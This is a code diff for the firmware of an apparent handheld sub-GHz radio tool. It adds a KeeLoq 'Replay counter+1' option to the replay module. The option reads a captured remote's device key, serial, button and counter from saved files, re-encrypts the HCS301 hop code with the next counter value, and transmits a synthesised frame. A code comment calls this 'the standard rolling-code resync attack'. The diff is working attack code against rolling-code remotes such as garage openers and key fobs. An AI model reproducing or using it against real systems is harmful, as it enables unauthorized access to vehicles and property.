@@ -16,6 +16,10 @@
 #include <string.h>
 #include <stdlib.h>
 
+#include "keeloq_pwm.h"
+#include "keeloq_decode.h"
+#include "keeloq_common.h"
+
 // Button pins, DARK_GRAY, and CC1101_GDO0_PIN come from shared.h + sub_shared.h.
 
 namespace SubReplay {
@@ -47,6 +51,20 @@ enum PresetKind { PRESET_UNKNOWN = 0, PRESET_OOK_650 = 1, PRESET_OOK_270 = 2 };
 static int parsedPreset = PRESET_UNKNOWN;
 static char loadedName[MAX_FILENAME] = "";
 static char errorMsg[64] = "";
+
+// KeeLoq metadata parsed from `# Hydra_KeeLoq_*` headers, if the file
+// has them. When `keeloqMatched` is true, the user gets an extra
+// "Replay counter+1" option that re-encrypts the hop with the next
+// counter value before transmitting — the standard rolling-code
+// resync attack.
+static bool     keeloqMatched      = false;
+static uint64_t keeloqDeviceKey    = 0;
+static uint32_t keeloqSerial       = 0;
+static uint8_t  keeloqButton       = 0;
+static uint8_t  keeloqStatus       = 0;
+static uint16_t keeloqCounter      = 0;
+static uint8_t  keeloqLearningType = 0;
+static char     keeloqMfrName[32]  = "";
 
 // Phase state
 static Phase phase = PHASE_LIST;
@@ -123,6 +141,14 @@ static bool loadFile(const char* filename) {
   parsedFreqHz = 0;
   parsedPreset = PRESET_UNKNOWN;
   errorMsg[0] = '\0';
+  keeloqMatched = false;
+  keeloqDeviceKey = 0;
+  keeloqSerial = 0;
+  keeloqButton = 0;
+  keeloqStatus = 0;
+  keeloqCounter = 0;
+  keeloqLearningType = 0;
+  keeloqMfrName[0] = '\0';
 
   char path[80];
   snprintf(path, sizeof(path), "/hydra/sub_files/%s", filename);
@@ -143,6 +169,28 @@ static bool loadFile(const char* filename) {
         parsedPreset = classifyPreset(line + 7);
       } else if (strncmp(line, "RAW_Data:", 9) == 0) {
         parseRawDataLine(line);
+      }
+      // KeeLoq metadata written by SubRecord. All optional; presence
+      // of "# Hydra_KeeLoq_Mfr:" flips keeloqMatched on so the
+      // counter+1 path becomes selectable.
+      else if (strncmp(line, "# Hydra_KeeLoq_Mfr:", 19) == 0) {
+        const char* p = line + 19;
+        while (*p == ' ' || *p == '\t') p++;
+        size_t n = strlen(p);
+        if (n >= sizeof(keeloqMfrName)) n = sizeof(keeloqMfrName) - 1;
+        memcpy(keeloqMfrName, p, n);
+        keeloqMfrName[n] = '\0';
+        keeloqMatched = true;
+      } else if (strncmp(line, "# Hydra_KeeLoq_LearningType:", 28) == 0) {
+        keeloqLearningType = (uint8_t)strtoul(line + 28, nullptr, 10);
+      } else if (strncmp(line, "# Hydra_KeeLoq_Serial:", 22) == 0) {
+        keeloqSerial = (uint32_t)strtoul(line + 22, nullptr, 0);
+      } else if (strncmp(line, "# Hydra_KeeLoq_Button:", 22) == 0) {
+        keeloqButton = (uint8_t)strtoul(line + 22, nullptr, 10);
+      } else if (strncmp(line, "# Hydra_KeeLoq_Counter:", 23) == 0) {
+        keeloqCounter = (uint16_t)strtoul(line + 23, nullptr, 10);
+      } else if (strncmp(line, "# Hydra_KeeLoq_DeviceKey:", 25) == 0) {
+        keeloqDeviceKey = strtoull(line + 25, nullptr, 0);
       }
 
       li = 0;
@@ -311,15 +359,28 @@ static void drawInfo() {
   tft.setCursor(2, LIST_TOP_Y + 119);
   tft.printf("%d", sampleCount);
 
+  // KeeLoq line (only if the .sub has Hydra_KeeLoq_* headers)
+  if (keeloqMatched) {
+    tft.setTextColor(TFT_MAGENTA);
+    tft.setCursor(2, LIST_TOP_Y + 134);
+    tft.printf("KeeLoq: %s (cnt %u)",
+               keeloqMfrName, (unsigned)keeloqCounter);
+  }
+
   tft.setTextColor(TFT_GREEN);
-  tft.setCursor(2, LIST_TOP_Y + 150);
-  tft.print("[UP]   TRANSMIT");
+  tft.setCursor(2, LIST_TOP_Y + 152);
+  tft.print("[UP]    Replay RAW");
+  if (keeloqMatched) {
+    tft.setTextColor(TFT_MAGENTA);
+    tft.setCursor(2, LIST_TOP_Y + 168);
+    tft.print("[RIGHT] Replay counter+1");
+  }
   tft.setTextColor(TFT_YELLOW);
-  tft.setCursor(2, LIST_TOP_Y + 168);
-  tft.print("[LEFT] Back to list");
+  tft.setCursor(2, LIST_TOP_Y + 184);
+  tft.print("[LEFT]  Back to list");
   tft.setTextColor(TFT_DARKGREY);
-  tft.setCursor(2, LIST_TOP_Y + 186);
-  tft.print("[SEL]  Exit feature");
+  tft.setCursor(2, LIST_TOP_Y + 200);
+  tft.print("[SEL]   Exit feature");
 }
 
 static void drawTx() {
@@ -482,6 +543,56 @@ void subReplayLoop() {
       toggleHeldFromPrev = true;
       drawHeader();
       drawDone();
+      return;
+    }
+    if (rightPressed && keeloqMatched) {
+      // Re-encrypt the hop with counter+1 and synthesise a fresh PWM
+      // frame from the captured (mfr, serial, button, status) fields.
+      // The synthesised frame overwrites subSampleBuf for the duration
+      // of this TX; the user can re-enter the file from the list if
+      // they want the original RAW capture back.
+      //
+      // Cleartext hop layout (HCS301):
+      //   bits 31..28: button (4)
+      //   bits 27..26: status (2 — VLOW, RPT)
+      //   bits 25..16: serial[0..9] (10) — discrimination bits
+      //   bits 15..0 : counter (16)
+      uint32_t cleartextHop =
+          ((uint32_t)(keeloqButton & 0xFu)   << 28) |
+          ((uint32_t)(keeloqStatus & 0x3u)   << 26) |
+          ((uint32_t)(keeloqSerial & 0x3FFu) << 16) |
+          (uint32_t)(keeloqCounter + 1u);
+      uint32_t newHop = Keeloq::encrypt(cleartextHop, keeloqDeviceKey);
+
+      KeeloqDecode::Frame fr;
+      fr.encryptedHop = newHop;
+      fr.serial       = keeloqSerial;
+      fr.button       = keeloqButton;
+      fr.status       = keeloqStatus;
+      int n = KeeloqPwm::buildFrame(fr, /*teShortUs=*/400,
+                                    sampleBuf, MAX_SAMPLES);
+      if (n > 0) {
+        sampleCount = n;
+        phase = PHASE_TX;
+        drawHeader();
+        drawTx();
+        cc1101TxPrep();
+        txStartedAt = millis();
+        bitbangAllSamples();
+        cc1101TxDone();
+        keeloqCounter++;              // so a second RIGHT press sends counter+2
+        phase = PHASE_DONE;
+        toggleHeldFromPrev = true;
+        drawHeader();
+        drawDone();
+      } else {
+        // Synthesis failed (buffer too small or bad teShort). Bail back.
+        strncpy(errorMsg, "PWM synth failed", sizeof(errorMsg));
+        phase = PHASE_ERROR;
+        toggleHeldFromPrev = true;
+        drawHeader();
+        drawError();
+      }
       return;
     }
   }
